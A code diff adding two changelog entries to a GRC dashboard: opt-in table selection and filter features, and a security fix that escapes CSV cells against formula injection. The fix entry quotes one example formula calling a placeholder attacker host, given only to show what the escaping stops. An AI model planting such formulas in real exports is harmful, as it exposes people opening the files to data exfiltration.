@@ -1475,8 +1475,24 @@ export const RELEASES: Release[] = [
 ]
 
 export const UNRELEASED: UnreleasedChanges = {
-  "entryCount": 44,
+  "entryCount": 46,
   "entries": [
+    {
+      "type": "feat",
+      "scope": "ui",
+      "summary": "**enterprise table capabilities** — opt-in row selection with a floating bulk-action bar on `DataTable`, dismissible faceted `FilterChips`, and a staggered `fade-in-up` entrance on KPI cards (Tailwind keyframes, no Framer Motion; zeroed under `prefers-reduced-motion` per WCAG 2.3.3). All four are opt-in, so the 36 existing `DataTable` pages are untouched until they pass the new props. Selection is keyed by a stable `getRowId`, never row index (which reshuffles under sort/filter), and the header checkbox acts on the current page only — selecting rows the operator cannot see is how a bulk action hits the wrong records. A page owns its bulk actions, so a mutating one is its own real throwing service call; the reference wiring (`VendorRegistry`) ships the safe **Export selected to CSV**. The Phase-1 \"dead-end\" interlinks the brief named were already in place (Incident → model via `InterlinkChip`, Risk → controls via `/controls/:id`, Agent → detail via a `?open=` Sheet), so those were left alone rather than re-done.",
+      "breaking": false,
+      "sha": null,
+      "section": null
+    },
+    {
+      "type": "fix",
+      "scope": "security",
+      "summary": "**close CSV formula injection (CWE-1236) in data exports.** New `dashboard/src/lib/csv.ts` (`toCsv`/`downloadCsv`) prefixes any cell beginning with `= + - @`/tab/CR with `'`, so a spreadsheet renders `=WEBSERVICE(\"http://attacker\")` as text instead of executing it when an auditor opens the file — and quotes every field per RFC 4180, which the hand-rolled exporters did not (a comma in a category broke the row; a `JSON.stringify`'d name still executed). Many exported fields are attacker-influenceable (a vendor name, an owner, a resource tag synced from a connected integration), so this is a real exposure in an export-heavy GRC product, not a theoretical one. `ModelRegistry` and `VendorRegistry` migrated onto the safe util; the remaining ~22 hand-rolled exporters are tracked as **TD-021** with the full list, being migrated incrementally rather than in one unreviewed overnight sweep that could silently regress audit-export columns. 14 new tests (CSV injection/quoting, faceted-filter derivation).",
+      "breaking": false,
+      "sha": null,
+      "section": null
+    },
     {
       "type": "fix",
       "scope": "integrations",
